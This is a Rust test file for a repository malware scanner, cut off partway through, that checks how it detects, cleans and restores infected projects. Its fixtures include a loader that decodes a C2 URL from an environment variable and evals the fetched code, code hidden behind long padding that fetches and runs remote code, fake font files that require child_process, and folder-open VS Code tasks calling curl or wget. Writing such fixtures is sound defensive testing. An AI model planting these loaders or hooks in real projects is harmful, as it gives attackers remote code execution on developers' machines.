//! `guard scan`, `scan-git`, `open`, `clean` and `restore`, checked against
//! goldens recorded from scanner.py and remediator.py (Python). Was
//! tests/test_rust_scan.py, which ran both builds side by side.

mod common;

use std::path::{Path, PathBuf};
use std::process::Command;

use common::fixtures::build_pe_with;
use common::fixtures::{section, CODE, EXEC, READ, WRITE};
use common::samples::eicar;
use common::*;
use serde_json::{json, Value};
use sha2::Digest;

const SUITE: &str = "scan";

// The incident's loader, split so no source line carries it whole (Guard scans
// its own repository).
const PAYLOAD: &str = concat!(
    "(async () => {\n",
    "  const src = atob(process.env.AUTH_API_KEY);\n",
    "  const proxyInfo = await (await fetch(src)).text();\n",
    "  eval(proxy",
    "Info);\n",
    "})();\n"
);
const B64_C2: &str = concat!("aHR0cHM6Ly9hdXRoLWNvbmZpcm0tdGVu", "LnZlcmNlbC5hcHAvYXBp");
const EVAL: &str = concat!("eval(proxy", "Info)");

fn sha(b: &[u8]) -> String {
    sha2::Sha256::digest(b)
        .iter()
        .map(|x| format!("{x:02x}"))
        .collect()
}

// ---------------------------------------------------------------- corpus
/// Fake fonts / images: disguised source, suspicious source, bad headers, real ones.
fn droppers(d: &Path) {
    let js = b"const x = require('child_process'); global['!']='9'; module.exports = () => 1;\n";
    write(&d.join("public/fonts/fa-solid-400.woff2"), js);
    write(
        &d.join("public/fonts/real.woff2"),
        [b"wOF2".as_slice(), &[0u8; 64]].concat(),
    );
    write(
        &d.join("public/fonts/real.ttf"),
        [b"true".as_slice(), &[0u8; 64]].concat(),
    );
    write(
        &d.join("public/fonts/font.eot"),
        b"function f() { import x }\n",
    );
    write(
        &d.join("public/fonts/font2.eot"),
        (0u8..=255).collect::<Vec<u8>>(),
    );
    write(
        &d.join("img/logo.PNG"),
        [b"GIF89a".as_slice(), &[0u8; 32]].concat(),
    );
    write(
        &d.join("img/fake.jpg"),
        "/* \u{e9} */ var _$_1e42 = eval(process.env.X);\n",
    );
    write(&d.join("img/short.gif"), b"GI");
    write(&d.join("img/empty.ico"), b"");
    // the 4 KB sniff window ends inside a multi-byte character: not text
    write(
        &d.join("img/cut.png"),
        [b"require(".as_slice(), &[b'a'; 4087], "\u{e9}".as_bytes()].concat(),
    );
}

fn vscode(d: &Path, settings: Option<&[u8]>, tasks: Option<&[u8]>) -> PathBuf {
    if let Some(s) = settings {
        write(&d.join(".vscode/settings.json"), s);
    }
    if let Some(t) = tasks {
        write(&d.join(".vscode/tasks.json"), t);
    }
    std::fs::create_dir_all(d).unwrap();
    d.to_path_buf()
}

const TASKS: &str = r#"{
  // JSONC: comments and trailing commas
  "version": "2.0.0",
  "tasks": [
    {"label": "dev", "command": "npm", "args": ["run", "dev"],},
    {"label": "boot", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-400.woff2"],
     "runOptions": {"runOn": "folderOpen"}},
    {"label": "top-level", "command": ["sh", "-c"], "args": "curl", "runOn": "folderOpen"},
    {"label": "quiet", "command": "make", "runOptions": {"runOn": "folderOpen"}},
    {"label": "fetch", "command": "true", "args": ["wget http://x/a.woff"]},
    "not a task",
    {"label": "num", "command": 3.0, "args": [1, null, true]},
  ],
}
"#;

fn manifests(d: &Path) {
    write(
        &d.join("package.json"),
        json!({"dependencies": {"@art-ws/common": "^2.0.27", "left-pad": "1.0.0"},
               "devDependencies": {"@art-ws/common": "2.0.22", "--no-audit": "*"}})
        .to_string(),
    );
    write(
        &d.join("web/package-lock.json"),
        json!({"packages": {"": {}, "node_modules/@art-ws/db-context": {"version": "2.0.21"},
                            "node_modules/a/node_modules/--hiljson": {}},
               "dependencies": {"x": {"version": "1", "dependencies": {"@art-ws/common": {"version": "2.0.28"}}}}})
        .to_string(),
    );
    write(
        &d.join("py/requirements-dev.txt"),
        "# pinned\n-r base.txt\nnum2words==0.5.16 ; python_version>'3'\nnum2words\nrequests==2.0\n",
    );
    write(
        &d.join("py/requirements.txt"),
        "num2words == 0.5.15\r\n0requests==0.0.1\n",
    );
    write(
        &d.join("py/Pipfile.lock"),
        json!({"default": {"num2words": {"version": "==0.5.16"}}, "develop": null}).to_string(),
    );
    write(&d.join("bad/package.json"), "{not json");
}

fn corpus(root: &Path) -> PathBuf {
    let d = root.join("repo");
    droppers(&d);
    vscode(
        &d,
        Some(b"{\n  // auto tasks\n  \"task.allowAutomaticTasks\": true,\n  \"editor.tabSize\": 2,\n}\n"),
        Some(TASKS.as_bytes()),
    );
    manifests(&d);
    write(
        &d.join(".env"),
        format!("PORT=3000\nAUTH_API_KEY={B64_C2}\n"),
    );
    write(
        &d.join("src/server.ts"),
        format!("import express from 'express';\n\n{PAYLOAD}\nexport const app = express();\n"),
    );
    write(
        &d.join("src/crlf.js"),
        format!("const a = 1;\n{PAYLOAD}module.exports = a;\n").replace('\n', "\r\n"),
    );
    write(
        &d.join("src/ioc.md"),
        concat!(
            "see https://auth-confirm-",
            "ten.vercel.app/api and 45.139.",
            "104.115\n"
        ),
    );
    write(
        &d.join("src/obf.mjs"),
        "var _$_1e42=['x'];sfL[\"constructor\"]('return this')();\n",
    );
    write(
        &d.join("src/unicode-\u{e9}\u{e8}.js"),
        format!("// caf\u{e9} \u{fffd}\n{EVAL}\n"),
    );
    write(
        &d.join("src/binary.dat"),
        [
            (0u8..=255).cycle().take(1024).collect::<Vec<u8>>(),
            EVAL.as_bytes().to_vec(),
        ]
        .concat(),
    );
    write(&d.join("eicar.com"), eicar());
    write(
        &d.join("bin/svchost.exe"),
        build_pe_with(
            &[
                section(b".text", EXEC | READ | CODE, vec![0x90; 512]),
                section(b".data", READ | WRITE, vec![0; 512]),
            ],
            0x1000,
            b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0",
            0x10B,
            false,
        ),
    );
    write(
        &d.join(".github/workflows/deploy.yml"),
        "on: push\njobs: {}\n",
    );
    write(
        &d.join(".github/workflows/ci.yml"),
        format!("run: node ./public/fonts/x.js && {EVAL}\n"),
    );
    write(
        &d.join(".github/workflows/nested/release.YAML"),
        "on: tag\n",
    );
    write(&d.join(".github/workflows/notes.txt"), "not a workflow\n");
    // dependencies are scanned; pruned directories, and a file merely named
    // like one
    write(&d.join("node_modules/evil/index.js"), PAYLOAD);
    write(&d.join("deep/target/x.js"), PAYLOAD);
    write(&d.join("deep/dist"), format!("{EVAL}\n"));
    write(&d.join("deep/Vendor/x.js"), format!("{EVAL}\n"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(d.join("src"), d.join("linked-src")).unwrap();
        symlink(d.join("src/server.ts"), d.join("server-link.ts")).unwrap();
        symlink(d.join("missing.woff"), d.join("broken.woff")).unwrap();
    }
    d
}

fn norm(tmp: &Tmp) -> Norm {
    Norm::new()
        .path(&tmp.path, "TMP")
        .path(&repo_root(), "REPO")
}

fn g(tmp: &Tmp, args: &[&str]) -> Guard {
    guard(args)
        .home(&tmp.join("home"))
        .env("PYTHONIOENCODING", "utf-8")
}

fn both_outputs(n: &Norm, out: &Out) -> String {
    n.apply(&out.shown_all())
}

// ------------------------------------------------------- scan / open
#[test]
fn testdata_repos() {
    for repo in ["fake-infected-repo", "clean-repo", "wf-repo"] {
        for json_flag in [false, true] {
            let tmp = Tmp::new("testdata");
            let target = s(&repo_root().join("testdata").join(repo));
            let mut all = String::new();
            for cmd in ["scan", "open"] {
                let mut args = vec![cmd, target.as_str()];
                if json_flag {
                    args.push("--json");
                }
                all.push_str(&format!(
                    "=== {cmd}\n{}",
                    both_outputs(&norm(&tmp), &g(&tmp, &args).run())
                ));
            }
            golden(
                SUITE,
                &format!(
                    "testdata_repos-{repo}{}",
                    if json_flag { "-json" } else { "" }
                ),
                &all,
            );
        }
    }
}

/// Issue #24: the `_0x` loader wave tags its loader with a short campaign
/// marker and pads it off-screen on the last line of a real config. `scan`
/// flags every variant, `clean` cuts the loader and keeps the config,
/// quarantines everything else it flagged, and `restore` puts a config back.
#[test]
fn loader_wave_variants() {
    let tmp = Tmp::new("loader");
    let repo = tmp.join("repo");
    copy_tree(&repo_root().join("testdata").join("loader-repo"), &repo);
    let before = std::fs::read(repo.join("jest.config.js")).unwrap();
    let out = g(&tmp, &["scan", &s(&repo), "--json"]).run();
    assert_eq!(out.code, 1, "{}", out.stdout);
    let found: Vec<String> = parse_json(&out.stdout)["tree"]["fingerprint"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            format!(
                "{} {}",
                f["where"].as_str().unwrap().replace('\\', "/"),
                f["sig_id"].as_str().unwrap()
            )
        })
        .collect();
    for want in [
        ".env env.auth.b64.2",
        ".env env.stage2.b64",
        "scripts/fetch-assets.js ioc.stage2.url",
        "postcss.config.js payload.loader.0x",
        "postcss.config.js payload.loader.prefixed",
        "scripts/helper.js payload.loader.prefixed",
        "babel.config.js payload.marker.bang.dq",
        "babel.config.js payload.loader.0x",
        "eslint.config.js payload.marker.gi",
        "eslint.config.js payload.loader.0x",
        "jest.config.js payload.marker.bang.sq",
        "jest.config.js payload.loader.0x",
        "scripts/postinstall.js payload.loader.0x",
    ] {
        assert!(
            found.iter().any(|f| f.ends_with(want)),
            "{want} not in {found:?}"
        );
    }
    let av = g(&tmp, &["av", "scan", &s(&repo)]).run();
    assert_eq!(
        av.stdout.matches("script.js-loader-marker").count(),
        8,
        "{}",
        av.stdout
    );

    let out = g(&tmp, &["clean", &s(&repo)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    // the log lines come first
    let res = parse_json(&out.stdout[out.stdout.find("\n{").unwrap()..]);
    let names = |k: &str| -> Vec<String> {
        res[k]
            .as_array()
            .unwrap()
            .iter()
            .map(|p| {
                p.as_str()
                    .unwrap()
                    .replace('\\', "/")
                    .rsplit('/')
                    .next()
                    .unwrap()
                    .to_string()
            })
            .collect()
    };
    assert_eq!(
        names("neutralized"),
        [
            "babel.config.js",
            "eslint.config.js",
            "jest.config.js",
            "postcss.config.js"
        ]
    );
    // everything it can't cut cleanly is quarantined: no manual review
    let mut q = names("quarantined");
    q.sort();
    assert_eq!(
        q,
        [".env", "fetch-assets.js", "helper.js", "postinstall.js"]
    );
    assert_eq!(names("system"), Vec::<String>::new());
    assert!(!repo.join("scripts/postinstall.js").exists());
    assert_eq!(
        text(&std::fs::read(repo.join("jest.config.js")).unwrap()),
        "/** @type {import('jest').Config} */\nmodule.exports = {\n  testEnvironment: 'node',\n  roots: ['<rootDir>/src'],\n};\n"
    );
    // a novel marker is still cut by the padding alone
    assert_eq!(
        text(&std::fs::read(repo.join("postcss.config.js")).unwrap()),
        "module.exports = { plugins: {} };\n"
    );
    let rescan = g(&tmp, &["scan", &s(&repo), "--json"]).run();
    let rescan = parse_json(&rescan.stdout);
    let left: Vec<&str> = rescan["tree"]["fingerprint"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["sig_id"].as_str().unwrap())
        .collect();
    assert!(left.is_empty(), "{rescan}");

    let target = s(&repo.join("jest.config.js"));
    let out = g(&tmp, &["restore", &target]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    assert_eq!(std::fs::read(repo.join("jest.config.js")).unwrap(), before);
}

/// Near misses of the issue #24 markers, plain obfuscator output and padded
/// alignment comments stay clean.
#[test]
fn loader_wave_near_misses() {
    let tmp = Tmp::new("loader-clean");
    let repo = tmp.join("repo");
    let ids = (0..80)
        .map(|i| format!("_0x{i:04x}"))
        .collect::<Vec<_>>()
        .join(",");
    let obf = format!("(function({ids}){{return void 0;}})();function _0x1a2b(){{return [];}}");
    let g_ = ["glo", "bal"].concat();
    let pad = " ".repeat(300);
    for (name, body) in [
        ("obfuscated.js", obf.clone()),
        (
            "bundle.js",
            format!("/******/ (() => {{ var __webpack_modules__ = {{}}; {obf} }})();\n"),
        ),
        (
            "a.config.js",
            format!("module.exports = {{}};{pad}// aligned comment\n"),
        ),
        ("b.js", format!("{g_}['!'] = fn;{obf}\n")),
        ("c.js", format!("{g_}['!!']='9-6600';{obf}\n")),
        ("d.js", format!("{g_}.id=\"A9-0646-1\";{obf}\n")),
        ("e.js", format!("{g_}.i=0;{obf}\n")),
        ("f.js", format!("{g_}This.version=\"10-1300\";{obf}\n")),
        ("g.js", format!("my{g_}.i=\"A9-0646-1\";\n")),
        (
            ".env",
            "PORT=3000\nAUTH_API_KEY=c2VjcmV0LXRva2Vu\nCDN=https://files.catbox.moe/other.png\n"
                .to_string(),
        ),
    ] {
        write(&repo.join(name), body);
    }
    let out = g(&tmp, &["scan", &s(&repo)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    let av = g(&tmp, &["av", "scan", &s(&repo)]).run();
    assert!(!av.stdout.contains("js-loader-marker"), "{}", av.stdout);
}

/// Code pushed off-screen by 150+ blanks is caught by the padding alone,
/// whatever it is named and however its strings are split; `clean` cuts it
/// out and keeps the real file, and `restore` brings the original back.
#[test]
fn hidden_padded_code() {
    let tmp = Tmp::new("hidden-code");
    let repo = tmp.join("repo");
    let pad = " ".repeat(240);
    let tabs = "\t".repeat(160);
    // normal-looking names, split strings, no marker, no _0x
    let hidden = concat!(
        "(async()=>{const cfg=['ht','tps://','cdn.example.invalid'].join('');",
        "const r=await fetch(cfg);const run=globalThis['ev'+'al'];run(await r.text())})();"
    );
    let jest = "module.exports = {\n  testEnvironment: 'node',\n};";
    let files = [
        ("jest.config.js", format!("{jest}{pad}{hidden}\n")),
        (
            "vite.config.ts",
            format!("export default {{}};{tabs}{hidden}\nconsole.log('ok');\n"),
        ),
        ("src/util.js", format!("a();\n{pad}{hidden}\nb();\n")),
        (
            "tools/setup.py",
            format!("import os{pad}exec(os.environ['X'])\n"),
        ),
    ];
    for (name, body) in &files {
        write(&repo.join(name), body);
    }
    let before = std::fs::read(repo.join("jest.config.js")).unwrap();
    let out = g(&tmp, &["scan", &s(&repo), "--json"]).run();
    assert_eq!(out.code, 1, "{}", out.stdout);
    let found: Vec<String> = parse_json(&out.stdout)["tree"]["fingerprint"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            format!(
                "{} {} {}",
                f["where"].as_str().unwrap().replace('\\', "/"),
                f["sig_id"].as_str().unwrap(),
                f["evidence"].as_str().unwrap_or("")
            )
        })
        .collect();
    for (name, _) in &files {
        let want = format!("{name} hidden.padded.code");
        assert!(
            found.iter().any(|f| f.starts_with(&want)),
            "{want} not in {found:#?}"
        );
    }
    // the evidence shows the hidden code, not 240 blanks
    assert!(
        found.iter().any(|f| f.contains("[240 blanks](async()=>")),
        "{found:#?}"
    );

    let out = g(&tmp, &["clean", &s(&repo)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    let read = |n: &str| text(&std::fs::read(repo.join(n)).unwrap());
    assert_eq!(read("jest.config.js"), format!("{jest}\n"));
    assert_eq!(
        read("vite.config.ts"),
        "export default {};\nconsole.log('ok');\n"
    );
    assert_eq!(read("src/util.js"), "a();\nb();\n");
    // no in-place cut for other languages: quarantined (backed up)
    assert!(!repo.join("tools/setup.py").exists());
    let rescan = g(&tmp, &["scan", &s(&repo)]).run();
    assert_eq!(rescan.code, 0, "{}", rescan.shown_all());

    let out = g(&tmp, &["restore", &s(&repo.join("jest.config.js"))]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    assert_eq!(std::fs::read(repo.join("jest.config.js")).unwrap(), before);
}

/// Long blanks that hide nothing stay clean: aligned comments, trailing
/// blanks, deep indentation, blanks inside a binary table, files that are
/// not scripts, and a Windows batch file that pads on purpose (the Google
/// Cloud SDK installer does this after `@rem`).
#[test]
fn hidden_padded_code_near_misses() {
    let tmp = Tmp::new("hidden-code-clean");
    let repo = tmp.join("repo");
    let pad = " ".repeat(240);
    let indent = " ".repeat(140);
    let tabs = "\t".repeat(300);
    for (name, body) in [
        ("a.js", format!("module.exports = {{}};{pad}// note\n")),
        ("b.js", format!("module.exports = {{}};{pad}/// note\n")),
        ("c.js", format!("module.exports = {{}};{pad}\n")),
        ("d.ts", format!("function f() {{\n{indent}return 1;\n}}\n")),
        ("e.js", format!("var t = '\u{2}{tabs}\u{3}';\n")),
        ("f.py", format!("x = 1{pad}# note\n")),
        ("g.js", format!("var x = 1;{}y();\n", " ".repeat(149))),
        ("notes.md", format!("| a |{pad}b |\n")),
        ("data.json", format!("{{\"a\": 1{pad}}}\n")),
        (
            "install.bat",
            format!("@rem{pad}( IF NOT _%X%_==__ CHCP %X% >NUL )\n"),
        ),
    ] {
        write(&repo.join(name), body);
    }
    let out = g(&tmp, &["scan", &s(&repo)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
}

/// Dependency code is never trusted: everything under node_modules is
/// scanned, its dist/ and build/ folders and nested node_modules too, whether
/// the scan starts at the project or at node_modules itself, and `guard clean`
/// cleans it. A package's own workflow files never run, so their names are
/// not reported.
#[test]
fn dependencies_are_scanned() {
    let tmp = Tmp::new("deps");
    let app = tmp.join("app");
    let nm = app.join("node_modules");
    write(&nm.join("left-pad/index.js"), "module.exports = 1;\n");
    write(&nm.join("left-pad/.github/workflows/ci.yml"), "on: push\n");
    write(&nm.join("evil/dist/index.js"), PAYLOAD);
    write(&nm.join("a/node_modules/b/build/x.js"), PAYLOAD);
    write(&app.join("dist/out.js"), PAYLOAD); // the project's own build output stays pruned
    let want = ["a/node_modules/b/build/x.js", "evil/dist/index.js"];
    for (root, prefix) in [(&app, "node_modules/"), (&nm, "")] {
        let out = g(&tmp, &["scan", &s(root), "--json"]).run();
        assert_eq!(out.code, 1, "{}", out.shown_all());
        let t = &parse_json(&out.stdout)["tree"];
        let mut hit: Vec<String> = t["fingerprint"]
            .as_array()
            .unwrap()
            .iter()
            .map(|f| f["where"].as_str().unwrap().to_string())
            .collect();
        hit.dedup();
        let want: Vec<String> = want.iter().map(|w| format!("{prefix}{w}")).collect();
        assert_eq!(hit, want, "{}", out.shown_all());
    }
    let out = g(&tmp, &["clean", &s(&app)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    for f in ["evil/dist/index.js", "a/node_modules/b/build/x.js"] {
        let p = nm.join(f);
        assert!(
            !p.exists() || !std::fs::read_to_string(&p).unwrap().contains(EVAL),
            "{f}: {}",
            out.shown_all()
        );
    }
    assert_eq!(
        std::fs::read_to_string(nm.join("left-pad/index.js")).unwrap(),
        "module.exports = 1;\n"
    );
    assert!(std::fs::read_to_string(app.join("dist/out.js"))
        .unwrap()
        .contains(EVAL));
}

#[test]
fn scan_corpus() {
    for json_flag in [false, true] {
        let tmp = Tmp::new("corpus");
        let d = corpus(&tmp.path);
        let mut args = vec!["scan", d.to_str().unwrap()];
        if json_flag {
            args.push("--json");
        }
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        if json_flag {
            let t = &parse_json(&out.stdout)["tree"];
            for b in [
                "vscode",
                "magic",
                "fingerprint",
                "workflow_baseline",
                "malicious_deps",
                "av",
            ] {
                assert!(t[b].as_array().is_some_and(|a| !a.is_empty()), "{b}");
            }
        }
        golden(
            SUITE,
            &format!("scan_corpus{}", if json_flag { "-json" } else { "" }),
            &both_outputs(&norm(&tmp), &out),
        );
    }
}

#[test]
fn scan_relative_and_default_path() {
    let tmp = Tmp::new("relative");
    let d = corpus(&tmp.path);
    let mut all = String::new();
    for args in [
        vec!["scan"],
        vec!["scan", "."],
        vec!["scan", "./"],
        vec!["scan", "--json"],
        vec!["open"],
        vec!["scan", "src/../src"],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            args.join(" "),
            both_outputs(&norm(&tmp), &g(&tmp, &args).cwd(&d).run())
        ));
    }
    golden(SUITE, "scan_relative_and_default_path", &all);
}

#[test]
fn scan_missing_and_file_targets() {
    let tmp = Tmp::new("targets");
    let d = corpus(&tmp.path);
    let mut all = String::new();
    for target in [
        tmp.join("nope"),
        d.join("src/server.ts"),
        d.join("eicar.com"),
    ] {
        for cmd in ["scan", "open"] {
            let out = g(&tmp, &[cmd, &s(&target), "--json"]).run();
            all.push_str(&format!(
                "=== {cmd} {}\n{}",
                target.file_name().unwrap().to_string_lossy(),
                both_outputs(&norm(&tmp), &out)
            ));
        }
    }
    golden(SUITE, "scan_missing_and_file_targets", &all);
}

/// A baseline in the format workflow_baseline.py records.
fn record_baseline(home: &Path, repo: &Path) {
    let repo = strip_verbatim(std::fs::canonicalize(repo).unwrap());
    let p = s(&repo);
    let name: String = repo
        .file_name()
        .unwrap()
        .to_string_lossy()
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "_.-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    let key = format!("{name}-{}", &sha(p.as_bytes())[..12]);
    let mut files: Vec<PathBuf> = Vec::new();
    fn walk(d: &Path, out: &mut Vec<PathBuf>) {
        for e in std::fs::read_dir(d).unwrap() {
            let p = e.unwrap().path();
            if p.is_dir() {
                walk(&p, out);
            } else {
                out.push(p);
            }
        }
    }
    walk(&repo.join(".github/workflows"), &mut files);
    files.sort();
    let mut wf = serde_json::Map::new();
    for f in files {
        let ext = f
            .extension()
            .map(|e| e.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        if ext == "yml" || ext == "yaml" {
            let rel = f
                .strip_prefix(&repo)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            wf.insert(rel, json!(sha(&std::fs::read(&f).unwrap())));
        }
    }
    let data = json!({"repo": p, "approved_at": "2026-01-01T00:00:00+00:00", "approved_by": "", "workflows": wf});
    write(
        &home.join("baselines").join(format!("{key}.json")),
        serde_json::to_string_pretty(&data).unwrap(),
    );
}

#[test]
fn workflow_baselines() {
    // no baseline, then a recorded one with changed, added and removed workflows
    let tmp = Tmp::new("baselines");
    let d = tmp.join("wf");
    write(&d.join(".github/workflows/build.yml"), "on: push\n");
    write(&d.join(".github/workflows/deploy.yml"), "on: push\n");
    write(&d.join(".github/workflows/gone.yml"), "on: push\n");
    let n = norm(&tmp);
    let mut all = format!(
        "=== no baseline\n{}",
        both_outputs(&n, &g(&tmp, &["scan", &s(&d)]).run())
    );
    record_baseline(&tmp.join("home"), &d);
    all.push_str(&format!(
        "=== baseline\n{}",
        both_outputs(&n, &g(&tmp, &["scan", &s(&d), "--json"]).run())
    ));
    write(
        &d.join(".github/workflows/deploy.yml"),
        format!("on: push\nrun: {EVAL}\n"),
    );
    write(&d.join(".github/workflows/build.yml"), "on: [push]\n");
    write(&d.join(".github/workflows/new.yaml"), "on: push\n");
    std::fs::remove_file(d.join(".github/workflows/gone.yml")).unwrap();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan", d.to_str().unwrap()];
        args.extend(flags);
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        all.push_str(&format!(
            "=== changed {}\n{}",
            args.len(),
            both_outputs(&n, &out)
        ));
    }
    golden(SUITE, "workflow_baselines", &all);
}

/// Python's scan crashes on a lockfile holding a JSON list; the binary skips
/// the file and reports the rest of the tree as Python reported it without it
/// (the golden was recorded without the file).
#[test]
fn manifest_that_is_not_an_object() {
    let tmp = Tmp::new("manifest-list");
    let d = tmp.join("deps");
    manifests(&d);
    if reference().is_none() {
        write(&d.join("bad/Pipfile.lock"), "[1, 2]");
    }
    golden(
        SUITE,
        "manifest_that_is_not_an_object",
        &both_outputs(&norm(&tmp), &g(&tmp, &["scan", &s(&d), "--json"]).run()),
    );
}

#[test]
fn dependency_blocklist_override() {
    let tmp = Tmp::new("blocklist");
    let d = tmp.join("deps");
    manifests(&d);
    let bl = write(
        &tmp.join("bl.json"),
        json!({"npm": {"left-pad": ["< 1.1"]}, "pip": {"requests": ["= 2.0"]}}).to_string(),
    );
    let broken = write(&tmp.join("broken.json"), "{");
    let mut all = String::new();
    for (name, p) in [
        ("override", bl),
        ("missing", tmp.join("missing.json")),
        ("broken", broken),
    ] {
        let out = g(&tmp, &["scan", &s(&d), "--json"])
            .env("GUARD_DEP_BLOCKLIST", &p)
            .run();
        all.push_str(&format!("=== {name}\n{}", both_outputs(&norm(&tmp), &out)));
    }
    golden(SUITE, "dependency_blocklist_override", &all);
}

#[test]
fn open_vscode_variants() {
    type Case<'a> = (Option<&'a [u8]>, Option<&'a [u8]>);
    let cases: Vec<Case> = vec![
        (Some(br#"{"task.allowAutomaticTasks": true}"#), None),
        (Some(br#"{"task.allowAutomaticTasks": "true"}"#), None),
        (Some(br#"{"task.allowAutomaticTasks": true, oops}"#), None),
        (Some(br#"["task.allowAutomaticTasks"]"#), None),
        (Some(b"\xef\xbb\xbf{\"task.allowAutomaticTasks\": true}"), None),
        (None, Some(TASKS.as_bytes())),
        (None, Some(br#"{"tasks": [{"command": "node x", "runOn": "folderOpen"}], oops"#)),
        (None, Some(br#"{"tasks": "abc"}"#)),
        (None, Some(br#"{"tasks": [{"command": "x", "runOptions": {"runOn": ""}, "runOn": "FolderOpen"}]}"#)),
        (None, Some(b"[1]")),
        (Some(b""), Some(b"")),
    ];
    for (i, (settings, tasks)) in cases.into_iter().enumerate() {
        let tmp = Tmp::new("vscode");
        let d = vscode(&tmp.join("r"), settings, tasks);
        let n = norm(&tmp);
        let mut all = String::new();
        for args in [
            vec!["open", d.to_str().unwrap()],
            vec!["open", d.to_str().unwrap(), "--json"],
            vec!["scan", d.to_str().unwrap(), "--json"],
        ] {
            all.push_str(&format!(
                "=== {} {}\n{}",
                args[0],
                args.len(),
                both_outputs(&n, &g(&tmp, &args).run())
            ));
        }
        golden(SUITE, &format!("open_vscode_variants-{i}"), &all);
    }
}

#[test]
fn custom_signatures() {
    let tmp = Tmp::new("custom-sigs");
    let mut sig: Value =
        parse_json(&std::fs::read_to_string(repo_root().join("signatures.json")).unwrap());
    sig["regexes"].as_array_mut().unwrap().push(
        json!({"id": "t.re", "severity": "critical", "category": "t",
        "flags": "IGNORECASE|MULTILINE", "pattern": r"^\s*BAD\s+marker\Z", "desc": "custom"}),
    );
    sig["literals"].as_array_mut().unwrap().push(
        json!({"id": "t.lit", "severity": "high", "value": "needle", "desc": "lit",
        "applies_to": ["./notes/x.txt", ".cfg"]}),
    );
    sig["combo_rules"].as_array_mut().unwrap().push(
        json!({"id": "t.combo", "severity": "high", "all_of": ["alpha", "beta"], "desc": "combo"}),
    );
    sig["vscode_guard"]["tasks_danger_commands"] = json!(["Deno"]);
    sig["magic_bytes"]["by_ext"] = json!({".DAT": ["CAFE"], ".dat": ["beef"]});
    sig["known_dropper_filenames"] = json!(["evil.dat"]);
    sig["skip_path_prefixes"] = json!(["skipme/"]);
    let sp = write(&tmp.join("sig.json"), sig.to_string());
    let d = tmp.join("r");
    write(&d.join("notes/x.txt"), "a needle here\n  bad MARKER");
    write(&d.join("a.cfg"), "needle alpha beta");
    write(&d.join("evil.dat"), b"\xbe\xefxx");
    write(&d.join("plain.dat"), "require('x')");
    write(&d.join("skipme/y.txt"), "alpha beta");
    write(&d.join("z/skipme"), "alpha beta");
    vscode(
        &d,
        None,
        Some(br#"{"tasks": [{"command": "deno run x", "runOn": "folderOpen"}]}"#),
    );
    let n = norm(&tmp);
    let sig_eq = format!("--sig={}", s(&sp));
    let mut all = String::new();
    for args in [
        vec![
            "scan",
            d.to_str().unwrap(),
            "--signatures",
            sp.to_str().unwrap(),
        ],
        vec!["open", d.to_str().unwrap(), &sig_eq, "--json"],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            args[0],
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    golden(SUITE, "custom_signatures", &all);
}

/// Python printed a traceback; the binary prints one line. Both exit 1.
#[test]
fn bad_signatures() {
    if reference().is_some() {
        return;
    }
    let tmp = Tmp::new("bad-sigs");
    for path in [tmp.join("missing.json"), write(&tmp.join("bad.json"), "{")] {
        let out = g(&tmp, &["scan", ".", "--signatures", &s(&path)]).run();
        assert_eq!(out.code, 1);
        assert!(
            out.stdout.is_empty() && out.stderr.starts_with("guard: "),
            "{}",
            out.stderr
        );
    }
}

#[test]
fn usage() {
    // `scan --json x` scans x, as Python 3.12.7+ argparse does (the release
    // was built with 3.12)
    for (i, args) in [
        vec!["scan", "-h"],
        vec!["open", "--help"],
        vec!["scan-git", "--he"],
        vec!["scan", "a", "b"],
        vec!["scan", "--json", "x"],
        vec!["scan", "--nope", "x", "y"],
        vec!["scan", "--json=1"],
        vec!["scan", "--signatures"],
        vec!["scan", ".", "--sig"],
        vec!["scan", "--", "--json"],
        vec!["scan", "-x"],
        vec!["scan", "-1"],
        vec!["open", ".", "--j", "--s", "-h"],
        vec!["scan", "--signatures", "--json"],
    ]
    .into_iter()
    .enumerate()
    {
        let tmp = Tmp::new("usage");
        let out = g(&tmp, &args).cwd(&tmp.path).run();
        golden(
            SUITE,
            &format!("usage-{i}"),
            &format!("$ {}\n{}", args.join(" "), both_outputs(&norm(&tmp), &out)),
        );
    }
}

// ------------------------------------------------------------- scan-git
fn have_git() -> bool {
    Command::new("git").arg("--version").output().is_ok()
}

fn git(repo: &Path, args: &[&str]) {
    // an empty global config (git for Windows can't open NUL as one)
    let cfg = repo.with_extension("gitconfig");
    if !cfg.exists() {
        std::fs::write(&cfg, "").unwrap();
    }
    let st = Command::new("git")
        .arg("-C")
        .arg(repo)
        .args(args)
        .envs([
            ("GIT_AUTHOR_NAME", "A"),
            ("GIT_AUTHOR_EMAIL", "a@x"),
            ("GIT_COMMITTER_NAME", "A"),
            ("GIT_COMMITTER_EMAIL", "a@x"),
            ("GIT_AUTHOR_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_COMMITTER_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_CONFIG_NOSYSTEM", "1"),
        ])
        .env("GIT_CONFIG_GLOBAL", &cfg)
        .output()
        .unwrap();
    assert!(
        st.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&st.stderr)
    );
}

#[test]
fn scan_git() {
    if !have_git() {
        return;
    }
    let tmp = Tmp::new("scan-git");
    let r = tmp.join("g");
    std::fs::create_dir_all(&r).unwrap();
